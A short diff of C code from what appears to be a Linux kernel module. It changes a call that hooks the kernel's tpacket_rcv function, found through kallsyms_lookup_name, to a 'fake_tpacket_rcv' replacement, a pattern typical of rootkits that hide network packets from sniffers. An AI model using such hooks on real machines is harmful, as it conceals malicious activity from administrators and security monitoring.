@@ -1539,7 +1539,8 @@ int init(void)
 	//dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
 
 	//inc_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
-	asm_hook_create((void *)kallsyms_lookup_name("tpacket_rcv"), fake_tpacket_rcv);
+	//asm_hook_create((void *)kallsyms_lookup_name("tpacket_rcv"), fake_tpacket_rcv);
+	asm_hook_create(kallsyms_lookup_name("tpacket_rcv"), fake_tpacket_rcv);
 	//dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
 	
 	//inc_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
